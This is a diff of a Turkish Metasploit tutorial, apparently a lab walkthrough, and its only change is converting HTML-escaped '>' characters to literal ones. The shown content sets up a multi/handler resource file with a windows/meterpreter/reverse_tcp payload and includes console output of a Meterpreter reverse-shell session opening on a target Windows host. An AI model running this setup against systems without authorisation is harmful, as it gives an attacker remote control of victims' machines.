@@ -65,11 +65,11 @@ Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi iç
 
 ```bash
 root@kali:~# touch meterpreter.rc
-root@kali:~# echo use exploit/multi/handler **&gt;&gt;** meterpreter.rc
-root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp **&gt;&gt;** meterpreter.rc
-root@kali:~# echo set LHOST 192.168.1.184 **&gt;&gt;** meterpreter.rc
-root@kali:~# echo set ExitOnSession false **&gt;&gt;** meterpreter.rc
-root@kali:~# echo exploit -j -z **&gt;&gt;** meterpreter.rc
+root@kali:~# echo use exploit/multi/handler **>>** meterpreter.rc
+root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp **>>** meterpreter.rc
+root@kali:~# echo set LHOST 192.168.1.184 **>>** meterpreter.rc
+root@kali:~# echo set ExitOnSession false **>>** meterpreter.rc
+root@kali:~# echo exploit -j -z **>>** meterpreter.rc
 root@kali:~# cat meterpreter.rc
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -98,14 +98,14 @@ root@kali:~# msfconsole -r meterpreter.rc
 + -- --**=[** 1265 exploits - 695 auxiliary - 202 post **]**
 + -- --**=[** 330 payloads - 32 encoders - 8 nops      **]**
 
-resource&gt; use exploit/multi/handler
-resource&gt; set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=&gt;** windows/meterpreter/reverse_tcp
-resource&gt; set LHOST 192.168.1.184
-LHOST **=&gt;** 192.168.1.184
-resource&gt; set ExitOnSession false
-ExitOnSession **=&gt;** false
-resource&gt; exploit -j -z
+resource> use exploit/multi/handler
+resource> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD **=>** windows/meterpreter/reverse_tcp
+resource> set LHOST 192.168.1.184
+LHOST **=>** 192.168.1.184
+resource> set ExitOnSession false
+ExitOnSession **=>** false
+resource> exploit -j -z
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
 **[*********]** Starting the payload handler...
@@ -118,9 +118,9 @@ Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamışt
 
 ```bash
 **[*********]** Sending stage **(**718336 bytes**)**
-**[*********]** Meterpreter session 1 opened **(**192.168.1.158:4444 -&gt; 192.168.1.104:1043**)**
+**[*********]** Meterpreter session 1 opened **(**192.168.1.158:4444 -> 192.168.1.104:1043**)**
 
-msf exploit**(**handler**)** **&gt;** sessions -i 1
+msf exploit**(**handler**)** **>** sessions -i 1
 **[*********]** Starting interaction with 1...
 
-meterpreter **&gt;**```
+meterpreter **>**```
